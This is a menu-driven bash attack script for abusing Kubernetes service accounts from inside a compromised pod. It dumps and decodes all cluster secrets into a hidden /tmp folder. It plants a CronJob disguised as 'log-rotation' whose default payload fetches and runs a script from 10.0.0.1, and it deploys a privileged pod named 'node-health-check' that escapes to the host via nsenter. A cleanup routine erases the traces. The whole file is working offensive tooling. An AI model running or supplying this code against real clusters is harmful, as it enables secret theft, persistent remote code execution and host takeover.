#!/bin/bash
# T1552.007 — Container API: Kubernetes API Abuse
# Abuse K8s service account for persistence and secret extraction

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_k8s"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1552.007 — Kubernetes API Abuse            ║"
    echo "  ║   Pod escape, secret theft, CronJob persist   ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_k8s() {
    echo -e "${CYAN}[*] Detecting Kubernetes environment...${NC}"
    echo ""

    local IN_K8S=false

    # Check for service account token
    if [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]; then
        IN_K8S=true
        echo -e "  ${GREEN}[+] Service account token found${NC}"
        echo -e "      Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
    fi

    # Check for K8s environment variables
    if [[ -n "$KUBERNETES_SERVICE_HOST" ]]; then
        IN_K8S=true
        echo -e "  ${GREEN}[+] K8s API server: ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}${NC}"
    fi

    # Check for kubectl
    if command -v kubectl &>/dev/null; then
        echo -e "  ${GREEN}[+] kubectl available${NC}"
        echo -e "      Context: $(kubectl config current-context 2>/dev/null || echo 'none')"
    fi

    if [[ "$IN_K8S" == false ]]; then
        echo -e "  ${RED}[!] Not running inside Kubernetes${NC}"
        echo -e "  ${YELLOW}[*] This technique is for use from within a compromised pod${NC}"
    fi

    echo ""
    return 0
}

extract_secrets() {
    echo -e "${CYAN}[*] Extracting Kubernetes secrets${NC}"
    echo ""

    local TOKEN APISERVER NAMESPACE
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    APISERVER="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_SERVICE_PORT:-443}"

    if [[ -z "$TOKEN" ]]; then
        echo -e "${YELLOW}[!] No service account token — trying kubectl${NC}"
        if command -v kubectl &>/dev/null; then
            kubectl get secrets --all-namespaces -o json 2>/dev/null | \
                python3 -c "
import json,sys,base64
data = json.load(sys.stdin)
for item in data.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    print(f'\\n[{ns}/{name}]')
    for k,v in item.get('data',{}).items():
        try: print(f'  {k}: {base64.b64decode(v).decode()}')
        except: print(f'  {k}: <binary>')
" 2>/dev/null
        else
            echo -e "${RED}[!] No access method available${NC}"
        fi
        return
    fi

    mkdir -p "$WORKDIR"

    echo -e "  ${YELLOW}Attempting secret enumeration via API...${NC}"

    # Try all namespaces
    local RESPONSE
    RESPONSE=$(curl -sk -H "Authorization: Bearer ${TOKEN}" \
        "${APISERVER}/api/v1/secrets" 2>/dev/null)

    if echo "$RESPONSE" | grep -q '"items"'; then
        echo "$RESPONSE" > "${WORKDIR}/all_secrets.json"
        echo -e "  ${GREEN}[+] All secrets dumped to ${WORKDIR}/all_secrets.json${NC}"

        # Parse and display
        echo "$RESPONSE" | python3 -c "
import json,sys,base64
data = json.load(sys.stdin)
for item in data.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    stype = item.get('type','')
    print(f'  [{ns}/{name}] ({stype})')
    for k,v in item.get('data',{}).items():
        try:
            decoded = base64.b64decode(v).decode()
            if len(decoded) < 200:
                print(f'    {k}: {decoded}')
            else:
                print(f'    {k}: <{len(decoded)} bytes>')
        except:
            print(f'    {k}: <binary>')
" 2>/dev/null
    else
        # Try namespace-scoped
        RESPONSE=$(curl -sk -H "Authorization: Bearer ${TOKEN}" \
            "${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets" 2>/dev/null)
        echo "$RESPONSE" > "${WORKDIR}/ns_secrets.json"
        echo -e "  ${GREEN}[+] Namespace secrets: ${WORKDIR}/ns_secrets.json${NC}"
    fi
}

deploy_cronjob() {
    echo -e "${CYAN}[*] Creating persistent CronJob${NC}"
    echo ""

    local TOKEN APISERVER NAMESPACE
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    APISERVER="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_SERVICE_PORT:-443}"

    read -p "  Payload command: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/k|sh"
    read -p "  Schedule (cron format) [*/5 * * * *]: " SCHEDULE
    [[ -z "$SCHEDULE" ]] && SCHEDULE="*/5 * * * *"

    if [[ -n "$TOKEN" ]]; then
        local CRONJOB_JSON
        CRONJOB_JSON=$(cat << JEOF
{
  "apiVersion": "batch/v1",
  "kind": "CronJob",
  "metadata": {
    "name": "log-rotation",
    "namespace": "${NAMESPACE:-default}"
  },
  "spec": {
    "schedule": "${SCHEDULE}",
    "jobTemplate": {
      "spec": {
        "template": {
          "spec": {
            "containers": [{
              "name": "rotate",
              "image": "alpine",
              "command": ["/bin/sh", "-c", "${CMD}"]
            }],
            "restartPolicy": "Never",
            "hostNetwork": true,
            "hostPID": true
          }
        }
      }
    }
  }
}
JEOF
)
        local RESULT
        RESULT=$(curl -sk -X POST \
            -H "Authorization: Bearer ${TOKEN}" \
            -H "Content-Type: application/json" \
            "${APISERVER}/apis/batch/v1/namespaces/${NAMESPACE:-default}/cronjobs" \
            -d "$CRONJOB_JSON" 2>/dev/null)

        if echo "$RESULT" | grep -q '"log-rotation"'; then
            echo -e "${GREEN}[+] CronJob 'log-rotation' created${NC}"
            echo -e "${GREEN}[+] Schedule: ${SCHEDULE}${NC}"
            echo -e "${YELLOW}[*] Runs: ${CMD}${NC}"
            echo -e "${YELLOW}[*] hostNetwork + hostPID = near-host access${NC}"
        else
            echo -e "${RED}[!] CronJob creation failed — RBAC may be restrictive${NC}"
            echo "$RESULT" | head -5
        fi
    elif command -v kubectl &>/dev/null; then
        kubectl create cronjob log-rotation \
            --image=alpine \
            --schedule="${SCHEDULE}" \
            -- /bin/sh -c "${CMD}" 2>/dev/null
        echo -e "${GREEN}[+] CronJob created via kubectl${NC}"
    else
        echo -e "${RED}[!] No API access available${NC}"
    fi
}

deploy_privileged_pod() {
    echo -e "${CYAN}[*] Deploying privileged pod for host escape${NC}"
    echo ""

    local TOKEN APISERVER NAMESPACE
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    APISERVER="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_SERVICE_PORT:-443}"

    if [[ -z "$TOKEN" ]] && ! command -v kubectl &>/dev/null; then
        echo -e "${RED}[!] No K8s access method available${NC}"; return
    fi

    local POD_JSON
    POD_JSON=$(cat << JEOF
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "node-health-check",
    "namespace": "${NAMESPACE:-default}"
  },
  "spec": {
    "hostNetwork": true,
    "hostPID": true,
    "hostIPC": true,
    "containers": [{
      "name": "health",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- /bin/bash"],
      "securityContext": {
        "privileged": true
      },
      "volumeMounts": [{
        "name": "host-root",
        "mountPath": "/host"
      }]
    }],
    "volumes": [{
      "name": "host-root",
      "hostPath": {"path": "/"}
    }],
    "restartPolicy": "Always"
  }
}
JEOF
)

    if [[ -n "$TOKEN" ]]; then
        curl -sk -X POST \
            -H "Authorization: Bearer ${TOKEN}" \
            -H "Content-Type: application/json" \
            "${APISERVER}/api/v1/namespaces/${NAMESPACE:-default}/pods" \
            -d "$POD_JSON" 2>/dev/null | grep -q "node-health-check" && \
            echo -e "${GREEN}[+] Privileged pod 'node-health-check' created${NC}" || \
            echo -e "${RED}[!] Pod creation failed${NC}"
    fi

    echo -e "${YELLOW}[*] Pod has: hostPID, hostNetwork, privileged, / mounted${NC}"
    echo -e "${YELLOW}[*] Exec into it: kubectl exec -it node-health-check -- chroot /host bash${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up K8s artifacts...${NC}"

    local TOKEN APISERVER NAMESPACE
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    APISERVER="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_SERVICE_PORT:-443}"

    if [[ -n "$TOKEN" ]]; then
        curl -sk -X DELETE -H "Authorization: Bearer ${TOKEN}" \
            "${APISERVER}/apis/batch/v1/namespaces/${NAMESPACE:-default}/cronjobs/log-rotation" 2>/dev/null
        curl -sk -X DELETE -H "Authorization: Bearer ${TOKEN}" \
            "${APISERVER}/api/v1/namespaces/${NAMESPACE:-default}/pods/node-health-check" 2>/dev/null
    elif command -v kubectl &>/dev/null; then
        kubectl delete cronjob log-rotation 2>/dev/null
        kubectl delete pod node-health-check 2>/dev/null
    fi

    rm -rf "$WORKDIR"
    echo -e "${GREEN}[+] K8s artifacts removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Detect K8s environment"
    echo -e "  ${CYAN}[2]${NC} Extract secrets"
    echo -e "  ${CYAN}[3]${NC} Deploy persistent CronJob"
    echo -e "  ${CYAN}[4]${NC} Deploy privileged pod (host escape)"
    echo -e "  ${CYAN}[5]${NC} Cleanup"
    echo ""
    read -p "Choose [1-5]: " OPT

    case "$OPT" in
        1) detect_k8s ;;
        2) extract_secrets ;;
        3) deploy_cronjob ;;
        4) deploy_privileged_pod ;;
        5) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
